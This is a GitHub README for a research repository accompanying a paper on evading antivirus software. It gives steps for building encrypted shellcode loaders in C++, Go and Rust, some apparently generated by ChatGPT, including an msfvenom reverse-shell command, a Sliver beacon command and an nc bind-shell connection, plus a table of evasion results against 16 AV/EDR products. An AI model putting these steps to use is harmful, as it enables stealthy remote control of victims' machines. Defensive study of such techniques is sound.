<!-- ABOUT THE PROJECT -->
## About The Project

This project was created to share the code that is mentioned in the following paper with the title, [Bypassing antivirus detection: old-school malware, new tricks](https://arxiv.org/abs/2305.04149). In this repository, we included all relevant C++, Go, Rust, and C++ code that was created by ChatGPT. The purpose of this project is to demonstrate that with simple and common evading techniques, a malicious executable can evade most, if not all, AV solutions. It should be noted that the study focused on Windows 11. So, probably these executables will be working in Windows 10, but I have not tested them.


### Built With

This section lists all major frameworks/libraries used to create this project. 
1. Go 1.19.5
2. Rust (nightly-x86_64-pc-windows-msvc toolchain)
3. Python 3.10
4. Visual C++ 2022
5. pycryptodomex


<!-- GETTING STARTED -->
## Getting Started




### Requirements
1. Install Go 1.19.5
2. Install Rust (nightly-x86_64-pc-windows-msvc toolchain)
3. Install Visual Studio 2022 (Rust + all Universal/Desktop C++ relevant packages)
4. Install C++ dependencies from Visual Studio 2022
5. Install Visual Studio Code (Go)
6. Install Python 3.10
7. Install pycryptodomex



<!-- USAGE EXAMPLES -->
## Usage
### For C++
1. Choose if the malicious executable will contain a shellcode or a binary file.
2. In case of a binary file, execute
3. pip install crypto pycroptodome
4. python encryptPy.py BIN_FILE_NAME
5. Put the relevant AES key into the C++ code
6. Insert the binary file as a resource, like "Resource-> Import -> Choose encrypted file -> Name it, e.g., FILE_RES"
7. Change the Debug option to Release and compile the code

Note: In case of the code to be unable to find "Crypto", find the installation folder of Python, with the following commands:
```
import os
import sys
os.path.dirname(sys.executable)
```
Go to this directory and find the "site-packages\crypto" folder and rename the "crypto" folder into "Crypto". For instance, my path was "C:\Users\user\AppData\Local\Programs\Python\Python310\Lib\site-packages"

### For Go
1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f go 
2. Remove "\0x" and new line values
3. Place the shellcode in the encryptGo.go file
4. Execute the code
5. Take the encrypted shellcode and place it in the decryptGo.go file
6. Compile the Go file to retrieve the .exe with the following command
```
go build -ldflags -H=windowsgui decryptGo.go
```

### For Rust
1. Place the shellcode.bin file to the same directory as with the encryptPython.py
2. Execute 
```
python encryptPython.py
```
to generate necessary files
3. Compile the code to retrieve the exe file
```
cargo build --release
```
Note: If you want to use Rust with two loaders, after encrypting the first binary file, edit the encryptPython.py file, to change the output name of the second binary file, as explained in the relevant Python comments. If you want to use only one loader, simply comment out the irrelevant code lines, as these have been noted in different comments in the Rust code.

Hint: In case of development, when the .exe process is running, Rust compiler will show "access denied" error, because it cannot replace the previous .exe file, due to the running process. Either stop this process, in this case is named "test" or rename the package name in the "Cargo.toml" file, from test to something different.

### For C++ (ChatGPT)
1. Create a WindowsApplication dummy project in Visual Studio 2022
2. Change debug to release
3. Choose the proper port.
4. Compile the code to generate the exe file
5. Connect from a Linux host with the following command
```
nc IP PORT
```
If everything is working correctly, you should receive a "Connection Established!" message and be able to execute cmd commands to receive their response. If this message was not received, check if this port is open for inbound traffic in the Windows Firewall settings. If not, simply add a firewall rule to allow this traffic.

Note: If you want to use random generated files, execute the following command
```
head -c 90M </dev/urandom > file-1
```
With "file-1" the name of the output file, and "90M" is the file size. You can generate and include as many files as you like.


## Receiving connections (generate bin file)
To be able to capture the response of these executables, I used two C2 servers, namely Sliver, and Nimplant. In addition to Metasploit, which was used for completeness. Also, C++ and Rust codes request a binary file to load into the process, while Go code loads a simple shellcode. So, to export such a file from Nimplant, execute:
```
python NimPlant.py compile
```
While, to generate such a file from Sliver, change the "IP" to the IP address of the hosted Sliver server and execute:
```
generate beacon --mtls IP --os windows --disable-sgn -f shellcode --skip-symbols --timeout 10
```
And start the "mtls" listener, by executing:
```
mtls
```

## AV Evasion
The following table refers to the executables with the best evasion rate from the study. This means that all these three executables had included randomly generated files, use the provided code, and for the Rust code, implemented both loaders. For the Paid versions of AVs, I tested in some cases their trial versions.  As we can observe from the following table, the evasion rate is quite high, especially in the case of Rust code, which managed to evade all most-common AV solutions. This is noted on 10/04/2023. More details of the AV evasion are mentioned in the relevant paper.

|  Product name | Go | C++ | Rust | Free/Paid version| AV/EDR|
|---|---|---|---|---|---|
|Avast|✗|  ✗ | ✓  | Free |AV|
|AVG |  ✗ |  ✗ | ✓  | Free |AV|
|  Avira|  ✓ | ✓  |  ✓ | Free |AV|
|  MS Defender |  ✓ | ✓  | ✓  | Free |AV|
|  Webroot | ✓  |  ✓ | ✓ | Paid |AV|
|  Eset Smart Security Premium |  ✗ |  ✓ |  ✓ | Paid |AV|
|  Bitdefender Total Security |  ✗ | ✓  | ✓ | Paid |AV|
| Kaspersky Small Office Security |  ✓ |✗   |✓ | Paid |AV|
| Sophos Home |  ✓ |  ✓ | ✓ | Paid |AV|
| MalwareBytes |  ✓ |  ✓ | ✓ | Paid |AV|
| McAfee Total Security |  ✓ | ✓  | ✓  | Paid |AV|
| Norton |  ✓ | ✓  |  ✓ | Paid |AV|
| Bitdefender Gravity Zone |  ✗ | ✓  |  ✓ | Paid |EDR|
| Sophos Central |  ✗ | ✓  |  ✓ | Paid |EDR|
| ESET Protect Cloud |  ✗ | ✓  |  ✓ | Paid |EDR|
| MS 365 Defender |  ✓ | ✓  |  ✓ | Paid |EDR|
| Results| 9/16| 13/16| 16/16| -- |--|

<!-- CONTRIBUTING -->
## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".


<!-- LICENSE -->
## License

Distributed under the MIT License. See `LICENSE` for more information. The relevant code is provided only for educational purposes and authorized audits. Use it at your own risk.



<!-- CONTACT -->
## Contact

Efstratios Chatzoglou -  efchatzoglou@gmail.com 


<!-- ACKNOWLEDGMENTS -->
## Acknowledgments
I would like to thank the developers that created the following three repositories, which they assisted into creating this one. The Go code is forked from https://github.com/sezzle/simpleGoAES, and https://github.com/Ne0nd0g/go-shellcode/tree/master/cmd/CreateProcess and the Rust code from https://github.com/cr7pt0pl4gu3/Pestilence. Also, I would like to thank the awesome C2 tools, Sliver https://github.com/BishopFox/sliver, and Nimplant https://github.com/chvancooten/NimPlant, along with the Sector7 courses that gave me the idea for this project. Lastly, I would like to thank [@gbkaragiannidis](https://www.github.com/gbkaragiannidis) who helped me with the FindTarget function of C++ code.

